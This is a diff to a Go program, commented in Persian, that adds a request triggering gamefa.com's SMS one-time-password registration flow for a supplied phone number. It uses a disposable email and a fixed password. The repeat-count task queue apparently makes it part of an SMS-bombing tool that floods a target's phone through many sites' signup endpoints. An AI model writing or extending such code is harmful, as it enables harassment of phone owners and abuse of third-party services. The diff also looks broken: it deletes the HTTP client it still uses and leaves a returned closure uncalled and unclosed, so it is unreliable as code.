@@ -17,7 +17,6 @@ import (
 	"sync"
 	"syscall"
 	"time"
-        "net/http/cookiejar"
 )
 
 func clearScreen() {
@@ -324,11 +323,6 @@ func main() {
 		cancel()
 	}()
 
-cookieJar, _ := cookiejar.New(nil)
-	client := &http.Client{
-		Jar: cookieJar,
-        Timeout: 10 * time.Second,
-	}
 	// تخمین اندازه کانال tasks: تعداد تکرار * (تعداد کل URLهای فعال)
 	tasks := make(chan func(), repeatCount*40) // 40 یک تخمین اولیه است، با توجه به تعداد URLهای اضافه شده تنظیم شود
 
@@ -781,6 +775,34 @@ cookieJar, _ := cookiejar.New(nil)
 			// گزارش وضعیت
 			ch <- resp.StatusCode
 		}
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// gamefa.com (Register flow 2 - SMS OTP step - POST Form) - اضافه کردن digits_reg_username
+		wg.Add(1)
+		tasks <- func() { // ساختار برای پاس دادن client
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "register")
+				formData.Set("digt_countrycode", "+98")
+				formData.Set("phone", getPhoneNumberNoZero(phone))
+				formData.Set("email", "koyaref766@kazvi.com")
+				formData.Set("digits_reg_password", "trrdfstrtft")
+				formData.Set("digits_process_register", "1")
+				formData.Set("instance_id", "74e5368dbcf91c938f44b2af4b21cb3a") // ممکن است پویا باشد
+				formData.Set("optional_data", "optional_data")
+				formData.Set("dig_otp", "")
+				formData.Set("digits", "1")
+				formData.Set("digits_redirect_page", "//gamefa.com/")
+				formData.Set("digits_form", "3827f92f86") // ممکن است پویا باشد
+				formData.Set("_wp_http_referer", "/?login=true")
+				formData.Set("container", "digits_protected")
+				formData.Set("sub_action", "sms_otp")
+				// >>>>>> اضافه کردن پارامتر digits_reg_username <<<<<<
+				formData.Set("digits_reg_username", "randomuser123") // یک مقدار نمونه، میتونی از یک تابع برای تولید اسم تصادفی استفاده کنی
+
+				sendFormRequest(c, ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch) // ارسال c
+			}
+
 	}
 	// --- پایان حلقه اصلی ---
 
